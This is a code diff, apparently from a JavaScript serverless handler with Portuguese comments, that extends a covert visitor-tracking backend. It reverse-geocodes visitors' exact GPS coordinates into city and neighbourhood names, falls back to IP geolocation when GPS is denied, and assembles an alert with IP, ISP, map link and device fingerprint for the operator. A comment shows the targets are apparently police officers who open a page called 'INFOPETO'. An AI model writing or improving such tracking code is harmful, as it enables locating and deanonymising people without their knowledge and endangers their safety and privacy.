@@ -17,27 +17,45 @@ export default async function handler(req, res) {
 
     // SE O CELULAR ENVIOU O GPS EXATO
     if (fingerprint.lat && fingerprint.lon) {
-        locText = `🎯 <b>GPS Exato Capturado</b>`;
-        mapsLink = `\n🗺️ <b>MAPA EXATO:</b> <a href="https://maps.google.com/maps?q=${fingerprint.lat},${fingerprint.lon}">Abrir no Google Maps</a>`;
+        let cidadeGPS = "Cidade não identificada";
+        let bairroGPS = "";
+
+        // FUNÇÃO DE INTELIGÊNCIA: Converte a coordenada exata em Nome da Cidade/Bairro
+        try {
+            const sateliteRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${fingerprint.lat}&lon=${fingerprint.lon}&zoom=14&accept-language=pt-br`);
+            const sateliteData = await sateliteRes.json();
+            if (sateliteData && sateliteData.address) {
+                cidadeGPS = sateliteData.address.city || sateliteData.address.town || sateliteData.address.village || sateliteData.address.municipality || cidadeGPS;
+                bairroGPS = sateliteData.address.suburb || sateliteData.address.neighbourhood || "";
+            }
+        } catch (e) {
+            console.error("Erro ao converter GPS em Cidade");
+        }
+
+        const localNome = bairroGPS ? `${bairroGPS}, ${cidadeGPS}` : cidadeGPS;
+        locText = `🎯 <b>GPS Exato:</b> ${localNome}`;
         
-        // Pega o IP apenas para saber a operadora de internet
+        // Link blindado, universal e direto para o App do Google Maps
+        mapsLink = `\n🗺️ <b>MAPA EXATO:</b> <a href="https://www.google.com/maps?q=${fingerprint.lat},${fingerprint.lon}">📍 Clicar para abrir no Google Maps</a>`;
+        
+        // Pega o IP apenas para saber a operadora de internet e a base da rede
         try {
             if (ip !== 'IP Desconhecido' && !ip.includes('127.0.0.1')) {
                 const geoRes = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}`);
                 const geo = await geoRes.json();
-                if (geo.status === 'success') locText += `\n📡 <b>Provedor (IP):</b> ${geo.isp}`;
+                if (geo.status === 'success') locText += `\n📡 <b>Provedor (IP):</b> ${geo.isp} (Base: ${geo.city})`;
             }
         } catch(e) {}
 
     } else {
-        // PLANO B: SE O POLICIAL NEGOU O GPS, USA O IP (PROVEDOR)
+        // PLANO B: SE O POLICIAL NEGOU O GPS, USA APROXIMAÇÃO POR IP
         try {
             if (ip !== 'IP Desconhecido' && !ip.includes('127.0.0.1')) {
                 const geoRes = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}`);
                 const geo = await geoRes.json();
                 if (geo.status === 'success') {
-                    locText = `${geo.city} - ${geo.regionName} (${geo.country})\n📡 <b>Provedor:</b> ${geo.isp}`;
-                    mapsLink = `\n🗺️ <b>MAPA (Aprox. IP):</b> <a href="https://maps.google.com/maps?q=${geo.lat},${geo.lon}">Abrir no Google Maps</a>`;
+                    locText = `📍 <b>Cidade (Aprox. por IP):</b> ${geo.city} - ${geo.regionName}\n📡 <b>Provedor:</b> ${geo.isp}`;
+                    mapsLink = `\n🗺️ <b>MAPA (Aprox.):</b> <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">📍 Clicar para abrir no Google Maps</a>`;
                 }
             }
         } catch (e) { console.error("Erro na geolocalização IP"); }
@@ -45,10 +63,10 @@ export default async function handler(req, res) {
 
     const linha = "➖➖➖➖➖➖➖➖➖➖\n";
     
-    // MENSAGEM BLINDADA EM HTML (Impede o Telegram de bugar e rejeitar a mensagem)
+    // MENSAGEM BLINDADA EM HTML
     const msgAcesso = `👀 <b>INFOPETO ACESSADO</b> 👀\n${linha}` +
         `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-        `📍 <b>LOCALIZAÇÃO:</b> \n${locText}${mapsLink}\n\n` +
+        `${locText}\n${mapsLink}\n\n` +
         `📱 <b>DADOS DO APARELHO:</b>\n` +
         `• <b>Sistema:</b> <code>${fingerprint.userAgent}</code>\n` +
         `• <b>Ecrã:</b> ${fingerprint.tela} (Touch: ${fingerprint.touch})\n` +
